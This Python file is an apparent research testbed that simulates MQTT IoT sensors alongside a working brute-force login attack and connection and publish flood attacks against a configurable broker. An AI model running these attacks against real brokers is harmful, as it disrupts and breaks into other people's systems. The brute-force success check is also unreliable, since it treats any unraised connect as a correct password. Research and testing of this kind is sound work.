#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
IITS - Industrial IoT Threat Simulator
==========================================================================

Attack simulator for IoT-MQTT environments intended for academic research.

This code allows you to simulate:
1. Legitimate IoT devices
2. Brute force attacks
3. DDoS attacks (flooding of connections and publications)

WARNING: Use only in controlled test environments.

==========================================================================
"""


import paho.mqtt.client as mqtt
import threading
import time
import random
import json
import logging
import argparse
import string
import sys
#from typing import Dict, List, Any, Optional


# =========================================================================
# LOGGING CONFIGURATION
# =========================================================================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("logs/iits.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("mqtt_sim")


# =========================================================================
# SIMULATED IOT DEVICES
# =========================================================================
class IoTDevice:
    """Simulates an IoT device that publishes data via MQTT."""
    
    def __init__(self, device_id, device_type, hardware_type, broker="localhost", port=1883):
        """Starting IoT devices."""
        self.id = device_id
        self.type = device_type
        self.hardware = hardware_type
        self.broker = broker
        self.port = port
        self.running = True
        
        # Topics config
        self.topic_pub = f"iot/sensor/{self.type}/{self.id}"
        self.topic_sub = f"iot/sensor/{self.type}/{self.id}/cmd"
        
        # MQTT Clients
        self.client_id = f"{self.type}_{self.id}_{random.randint(1000, 9999)}"
        self.client = mqtt.Client(client_id=self.client_id)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
    

    def on_connect(self, client, userdata, flags, rc):
        """Callback when the device connects to the broker."""
        if rc == 0:
            logger.info(f"Device {self.id} ({self.hardware}) connected to MQTT broker")
            client.subscribe(self.topic_sub)
        else:
            logger.error(f"Device {self.id} ({self.hardware}) failed to connect, code {rc}")


    def on_message(self, client, userdata, msg):
        """Callback when the device receives a message."""
        logger.info(f"Device {self.id} received a message in the topic {msg.topic}: {msg.payload.decode()}")
        

    def generate_data(self):
        """Generates data based on any type of device."""
        timestamp = time.time()
        
        if self.type == "temperature":
            valor = round(random.uniform(15, 30), 2)
            unidade = "°C"
        elif self.type == "humidity":
            valor = round(random.uniform(30, 70), 2)
            unidade = "%"
        elif self.type == "luminosity":
            valor = random.randint(0, 1000)
            unidade = "lux"
        else:
            valor = random.randint(0, 100)
            unidade = "units"
            
        return {
            "device": self.id,
            "type": self.type,
            "hardware": self.hardware,
            "value": valor,
            "unit": unidade,
            "timestamp": timestamp
        }
    
        
    def publish_data(self):
        """Publish data to MQTT topic."""
        data = self.generate_data()
        payload = json.dumps(data)
        
        result = self.client.publish(self.topic_pub, payload)
        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            logger.info(f"Device {self.id} published in {self.topic_pub}: {payload}")
        else:
            logger.error(f"Device {self.id} failed to publish: {result.rc}")
            

    def start(self):
        """Start IoT device."""
        try:
            self.client.connect(self.broker, self.port, keepalive=60)
            self.client.loop_start()
            
            while self.running:
                self.publish_data()
                # Random interval between publications
                time.sleep(random.randint(3, 8))
                
        except Exception as e:
            logger.error(f"Error on device {self.id}: {e}")
        finally:
            self.stop()

            
    def stop(self):
        """Stop the IoT device."""
        self.running = False
        self.client.loop_stop()
        self.client.disconnect()
        

# =========================================================================
# BRUTE FORCE ATTACK
# =========================================================================
class BruteForceAttack:
    """Simulates a brute force attack on an MQTT broker."""
    
    def __init__(self, broker="localhost", port=1883, target_username="admin", rate=10):
        """Start a brute force attack simulator."""
        self.broker = broker
        self.port = port
        self.target_username = target_username
        self.rate = rate  # tries per second
        self.running = False
        self.password_attempts = 0

        
    def _attempt_login(self, password):
        """Try to log in to the broker with a specific password."""
        client_id = f"bruteforce_{random.randint(1000, 9999)}"
        client = mqtt.Client(client_id=client_id)
        client.username_pw_set(self.target_username, password)
        
        try:
            client.connect(self.broker, self.port, keepalive=10)
            client.disconnect()
            logger.warning(f"SUCCESSFULLY BRUTE FORCE: Username: {self.target_username}, Password: {password}")
            return True
        except:
            return False
        
            
    def _generate_password(self, length=8):
        """Generates a random password."""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
        
    def start(self, duration=60):
        """Starts brute force attack for a specific period of time."""
        self.running = True
        self.password_attempts = 0
        start_time = time.time()
        
        logger.info(f"Starting brute force attack against {self.broker}:{self.port}")
        
        try:
            while self.running and time.time() - start_time < duration:
                password = self._generate_password()
                self._attempt_login(password)
                self.password_attempts += 1
                
                # Respects the configured retry rate
                time.sleep(1 / self.rate)
                
                # Loggin every 10 tries
                if self.password_attempts % 10 == 0:
                    logger.info(f"Brute force: {self.password_attempts} attempts made")
                    
        except Exception as e:
            logger.error(f"Error during brute force attack: {e}")
        finally:
            self.running = False
            logger.info(f"Brute force attack successfully finished: {self.password_attempts} attempts made")

            
    def stop(self):
        """Stop the brute force attack."""
        self.running = False


# =========================================================================
# DDOS ATTACKS
# =========================================================================
class DDoSAttack:
    """Simulates a DDoS attack on an MQTT broker."""
    
    def __init__(self, broker="localhost", port=1883, attack_type="connection", rate=50):
        """Starts DDos attack simulator."""
        self.broker = broker
        self.port = port
        self.attack_type = attack_type  # "connection" or "publish"
        self.rate = rate  # operations per second
        self.running = False
        self.clients = []
        self.operations_count = 0

        
    def _flood_connections(self, duration):
        """Floods the broker with connections."""
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            # Creates multiple connections in each cycle
            for _ in range(min(10, self.rate // 10)):
                try:
                    client_id = f"ddos_{random.randint(10000, 999999)}"
                    client = mqtt.Client(client_id=client_id)
                    client.connect(self.broker, self.port, keepalive=60)
                    self.clients.append(client)
                    self.operations_count += 1
                except:
                    pass
                    
            # Periodic logging
            if self.operations_count % 50 == 0:
                logger.info(f"DDoS Connection Flood: {self.operations_count} created connections")
                
            time.sleep(1)  # Rate control

            
    def _flood_publish(self, duration):
        """Floods the broker with messages."""
        start_time = time.time()
        
        # Create some base connections for the attack
        base_clients = []
        for i in range(5):
            try:
                client_id = f"ddos_pub_{i}_{random.randint(1000, 9999)}"
                client = mqtt.Client(client_id=client_id)
                client.connect(self.broker, self.port, keepalive=60)
                client.loop_start()
                base_clients.append(client)
            except:
                continue
                
        if not base_clients:
            logger.error("Could not establish connections for publishing attack")
            return
            
        # Generates topics for the attack
        topics = [f"ddos/flood/topic/{i}" for i in range(10)]
        
        # Execute the attack
        while self.running and time.time() - start_time < duration:
            try:
                # Publish messages in multiples topics
                for client in base_clients:
                    for topic in topics:
                        payload = ''.join(random.choice(string.ascii_letters) for _ in range(50))
                        client.publish(topic, payload)
                        self.operations_count += 1
                        
                # Periodic logging
                if self.operations_count % 100 == 0:
                    logger.info(f"DDoS Publish Flood: {self.operations_count} sent messages")
                    
                # Rate control
                time.sleep(1)
            except Exception as e:
                logger.error(f"Error during publish DDoS attack: {e}")
                
        # Clients cleanup
        for client in base_clients:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

                
    def start(self, duration=60):
        """Starts DDos attack simulator for a specific period of time."""
        self.running = True
        self.operations_count = 0
        
        logger.info(f"Starting DDoS attack ({self.attack_type}) against {self.broker}:{self.port}")
        
        if self.attack_type == "connection":
            self._flood_connections(duration)
        elif self.attack_type == "publish":
            self._flood_publish(duration)
        else:
            logger.error(f"Unknown attack type: {self.attack_type}")
            
        logger.info(f"DDoS attack finished: {self.operations_count} operations performed")

        
    def stop(self):
        """Stop the DDoS atack."""
        self.running = False
        
        # Cleanup all connections
        for client in self.clients:
            try:
                client.disconnect()
            except:
                pass
                
        self.clients = []


# =========================================================================
# SIMULATION MANAGER
# =========================================================================
class SimulationManager:
    """Manages the simulation of IoT devices and attacks."""
    
    def __init__(self, config):
        """Initializes the simulation manager with the given configuration."""
        self.config = config
        self.devices = []
        self.device_threads = []
        self.attack_threads = []
        self.running = False

        
    def create_devices(self):
        """Creates simulated IoT devices based on the configuration."""
        devices_count = self.config.get("devices", 5)
        logger.info(f"Creating {devices_count} IoT devices")
        
        device_types = ["temperature", "humidity", "luminosity"]
        hardware_types = ["Raspberry Pi", "ESP32", "Arduino", "ESP8266"]
        
        for i in range(devices_count):
            device_type = random.choice(device_types)
            hardware_type = random.choice(hardware_types)
            device_id = f"{device_type}_{i+1}"
            
            device = IoTDevice(
                device_id=device_id,
                device_type=device_type,
                hardware_type=hardware_type,
                broker=self.config.get("broker", "localhost"),
                port=self.config.get("port", 1883)
            )
            
            self.devices.append(device)
            
        logger.info(f"{len(self.devices)} IoT devices created")

        
    def start_devices(self):
        """Starts all IoT devices."""
        logger.info("Starting IoT devices")
        
        for device in self.devices:
            thread = threading.Thread(target=device.start)
            thread.daemon = True
            self.device_threads.append(thread)
            thread.start()
            

    def start_bruteforce_attack(self):
        """Starts a brute force attack."""
        if not self.config.get("bruteforce", False):
            return
            
        logger.info("Configuring brute force attack")
        attack = BruteForceAttack(
            broker=self.config.get("broker", "localhost"),
            port=self.config.get("port", 1883),
            target_username=self.config.get("bruteforce_username", "admin"),
            rate=self.config.get("bruteforce_rate", 10)
        )
        
        attack_duration = self.config.get("bruteforce_duration", 60)
        thread = threading.Thread(target=attack.start, args=(attack_duration,))
        thread.daemon = True
        self.attack_threads.append((thread, attack))
        thread.start()

        
    def start_ddos_attack(self):
        """Starts a DDoS attack."""
        if not self.config.get("ddos", False):
            return
            
        attack_type = self.config.get("ddos_type", "connection")
        logger.info(f"Configuring '{attack_type}' DDoS attack")
        
        attack = DDoSAttack(
            broker=self.config.get("broker", "localhost"),
            port=self.config.get("port", 1883),
            attack_type=attack_type,
            rate=self.config.get("ddos_rate", 50)
        )
        
        attack_duration = self.config.get("ddos_duration", 60)
        thread = threading.Thread(target=attack.start, args=(attack_duration,))
        thread.daemon = True
        self.attack_threads.append((thread, attack))
        thread.start()

        
    def run(self):
        """Runs the complete simulation."""
        self.running = True
        start_time = time.time()
        duration = self.config.get("duration", 300)
        
        logger.info(f"Starting simulation for {duration} seconds")
        
        # Create and start IoT devices
        self.create_devices()
        self.start_devices()
        
        # Wait for devices to stabilize
        time.sleep(10)
        
        # Start attacks if configured
        if self.config.get("bruteforce", False):
            delay = duration * 0.25  # Starts attack after 25% of the time
            logger.info(f"Scheduling brute force attack to start in {int(delay)}s")
            timer = threading.Timer(delay, self.start_bruteforce_attack)
            timer.daemon = True
            timer.start()
            
        if self.config.get("ddos", False):
            delay = duration * 0.5  # Starts attack after 50% of the time
            logger.info(f"Scheduling DDoS attack to start in {int(delay)}s")
            timer = threading.Timer(delay, self.start_ddos_attack)
            timer.daemon = True
            timer.start()
            
        # Execute the simulation for the specified duration
        try:
            end_time = start_time + duration
            while time.time() < end_time and self.running:
                elapsed = time.time() - start_time
                
                # Status updates every 30 seconds
                if int(elapsed) % 30 == 0 and int(elapsed) > 0:
                    remaining = int(end_time - time.time())
                    logger.info(f"Running simulation: {int(elapsed)}s elapsed, {remaining}s remaining")
                    
                time.sleep(1)
                
        except KeyboardInterrupt:
            logger.info("Simulation interrupted by user")
        finally:
            self.stop()
            
            
    def stop(self):
        """Stops the simulation and components."""
        if not self.running:
            return
            
        logger.info("Stopping simulation...")
        
        # Stop all devices
        for device in self.devices:
            device.stop()
            
        # Stop all attacks
        for _, attack in self.attack_threads:
            attack.stop()
            
        self.running = False
        logger.info("Simulation stopped successfully")


# =========================================================================
# MAIN FUNCTION
# =========================================================================
def parse_args():
    """Analyzes command line arguments."""
    parser = argparse.ArgumentParser(description="MQTT Attack Simulator")
    
    # General configuration
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--duration", type=int, default=300, help="Simulation duration in seconds")
    
    # Devices configuration
    parser.add_argument("--devices", type=int, default=5, help="Number of simulated IoT devices")
    
    # Attacks
    parser.add_argument("--bruteforce", action="store_true", help="Enable brute force attack")
    parser.add_argument("--bruteforce-rate", type=int, default=10, help="Force brute rate (attempts/second)")
    parser.add_argument("--bruteforce-username", default="admin", help="Force brute target username")
    
    parser.add_argument("--ddos", action="store_true", help="Enable DDoS attack")
    parser.add_argument("--ddos-type", choices=["connection", "publish"], default="connection", help="DDoS attack type")
    parser.add_argument("--ddos-rate", type=int, default=50, help="DDoS attack rate (operations/second)")
    
    # Advanced options
    parser.add_argument("--log-level", choices=["DEBUG", "INFO", "WARNING", "ERROR"], default="INFO", help="Logging level")
    
    return parser.parse_args()


def main():
    """Main function."""
    print("\n" + "="*80)
    print(" IITS - Industrial IoT Threat Simulator".center(80, "="))
    print("="*80)
    print("\nWARNING: Use only in controlled test environments.\n")
    
    args = parse_args()
    
    # Logging level configuration
    log_level = getattr(logging, args.log_level)
    logger.setLevel(log_level)
    
    # Create the configuration
    config = {
        "broker": args.broker,
        "port": args.port,
        "duration": args.duration,
        "devices": args.devices,
        "bruteforce": args.bruteforce,
        "bruteforce_rate": args.bruteforce_rate,
        "bruteforce_username": args.bruteforce_username,
        "ddos": args.ddos,
        "ddos_type": args.ddos_type,
        "ddos_rate": args.ddos_rate
    }
    
    logger.info(f"Configuration: {json.dumps(config, indent=2)}")
    
    # Start the simulation
    manager = SimulationManager(config)
    
    try:
        manager.run()
    except KeyboardInterrupt:
        print("\nStopping simulation...")
    finally:
        if hasattr(manager, 'running') and manager.running:
            manager.stop()
            
    print("\nSimulation finished. Check the log file for details.")
    

if __name__ == "__main__":
    main()
